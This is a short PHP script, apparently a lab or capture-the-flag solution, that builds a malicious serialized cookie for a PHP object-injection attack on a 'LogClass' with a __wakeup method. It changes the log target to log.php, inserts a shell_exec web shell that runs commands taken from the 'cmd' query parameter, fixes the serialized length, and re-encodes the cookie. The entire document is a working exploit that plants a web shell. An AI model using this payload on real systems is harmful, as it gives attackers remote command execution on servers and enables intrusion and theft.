<?php

$cookie = base64_decode("Tzo4OiJMb2dDbGFzcyI6Mjp7czo3OiJsb2dGaWxlIjtzOjc6ImxvZy50eHQiO3M6MzoibG9nIjtzOjI1OiJ0cmlnZ2VyZWQgX193YWtldXAgbWV0aG9kIjt9");

$cookie = str_replace("log.txt", "log.php", $cookie);
$cookie = str_replace("triggered __wakeup method", '<?php echo shell_exec($_GET["cmd"]); ?>', $cookie);
$cookie = str_replace("s:25", 's:39', $cookie);

echo base64_encode($cookie);
